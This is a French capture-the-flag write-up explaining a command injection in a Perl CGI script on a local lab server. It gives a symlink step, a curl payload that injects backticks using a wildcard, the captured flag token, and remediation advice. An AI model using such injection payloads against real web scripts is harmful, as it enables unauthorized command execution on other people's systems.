# Rapport de Vulnérabilité : Injection de Commande Perl via CGI

## Description
Cette vulnérabilité exploite une injection de commandes via un script Perl CGI (`level12.pl`) accessible localement via un serveur web tournant sur le port 4646. Le script utilise les entrées utilisateur sans filtrage adéquat dans une commande système (`egrep`). En exploitant cette vulnérabilité, il est possible d'exécuter arbitrairement des commandes shell avec les privilèges de l'utilisateur flag12 et ainsi récupérer le token pour passer au niveau suivant.

## Comment Exploiter la Faille

### Étape 1 : Analyse du script vulnérable

**Code complet du script `level12.pl` :**
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}
sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}
n(t(param("x"), param("y")));
```

**Points clés d'analyse :**
- Le paramètre `x` subit deux transformations :
  1. `$xx =~ tr/a-z/A-Z/;` → Conversion en majuscules
  2. `$xx =~ s/\s.*//;` → Suppression de tout après le premier espace
- La vulnérabilité se trouve dans : `@output = `egrep "^$xx" /tmp/xd 2>&1`;`
- `$xx` est injecté directement dans la commande système sans échappement

### Étape 2 : Contournement des restrictions

**Problème :** Les transformations du script limitent notre payload :
- Majuscules uniquement
- Tout après un espace est supprimé

**Solution :** Utiliser le caractère wildcard `*` qui n'est pas affecté par ces transformations et permet de contourner les restrictions de chemin.

### Étape 3 : Préparation de l'exploitation

**Création du lien symbolique :**
```bash
ln -s /bin/getflag /tmp/GETFLAG
```

Cette étape est cruciale car elle permet de créer un lien vers `getflag` avec un nom en majuscules, compatible avec la transformation du script.

### Étape 4 : Exécution de l'attaque

**Payload d'injection :**
```bash
curl 'http://localhost:4646/level12.pl?x="%60/*/GETFLAG>%262%60"'
```

**Décomposition du payload :**
- `%60` = backtick (`) encodé en URL
- `/*/GETFLAG` = utilise le wildcard `*` pour contourner les restrictions
- `>%262` = redirige vers stderr (`%26` = `&`, `2` = stderr)
- Le tout est encadré de backticks pour exécution de commande

**Mécanisme d'exploitation :**
1. Le script transforme le payload : `%60/*/GETFLAG>%262%60` → `/*/GETFLAG>&2`
2. Les backticks décodés provoquent l'exécution : `egrep "^`/*/GETFLAG>&2`" /tmp/xd`
3. La commande `/tmp/GETFLAG` (via le lien symbolique) s'exécute et redirige vers stderr

### Étape 5 : Récupération du flag

**Consultation des logs d'erreur Apache :**
```bash
cat /var/log/apache2/error.log
```

**Résultat obtenu :**
```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

**Flag obtenu :**
```
g1qKMiRpXf53AWhDaU7FEkczr
```

### Étape 6 : Passage au niveau suivant

```bash
su level13
```
**Mot de passe :**
```
g1qKMiRpXf53AWhDaU7FEkczr
```

---

## Mécanisme détaillé de l'exploitation

### Transformation des données :
1. **Input original :** `"%60/*/GETFLAG>%262%60"`
2. **Après décodage URL :** `` `/*/GETFLAG>&2` ``
3. **Après tr/a-z/A-Z/ :** `` `/*/GETFLAG>&2` `` (pas de changement)
4. **Après s/\s.*// :** `` `/*/GETFLAG>&2` `` (pas d'espace, pas de changement)
5. **Injection finale :** `egrep "^`/*/GETFLAG>&2`" /tmp/xd`

### Exécution de la commande injectée :
- Le shell exécute d'abord la commande entre backticks : `/*/GETFLAG>&2`
- Le wildcard `*` se résout vers `/tmp/GETFLAG` (notre lien symbolique)
- `getflag` s'exécute et sa sortie est redirigée vers stderr
- Le résultat de `getflag` remplace les backticks dans la commande `egrep`

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Validation stricte des entrées utilisateur :**
  - Utiliser des listes blanches de caractères autorisés
  - Rejeter toute entrée contenant des caractères spéciaux shell

* **Échappement sécurisé :**
  - Utiliser `quotemeta()` pour échapper les métacaractères
  - Implémenter un filtrage strict des backticks, pipes, redirections

* **Éviter l'exécution de commandes avec entrées utilisateur :**
  - Remplacer les backticks par des appels système sécurisés
  - Utiliser `open()` avec liste de paramètres explicites

**Code sécurisé suggéré :**
```perl
use File::Basename;
$xx = quotemeta($xx);  # Échappement sécurisé
# Ou mieux : utiliser une approche sans appel système
```

## Conclusion

Cette vulnérabilité illustre parfaitement les dangers de l'injection de commandes dans les applications web CGI. Malgré les transformations appliquées aux entrées (majuscules, suppression d'espaces), l'utilisation du wildcard `*` et des redirections permet de contourner ces protections rudimentaires. Une validation stricte et un échappement approprié des entrées utilisateur sont essentiels pour prévenir ce type d'exploitation.

---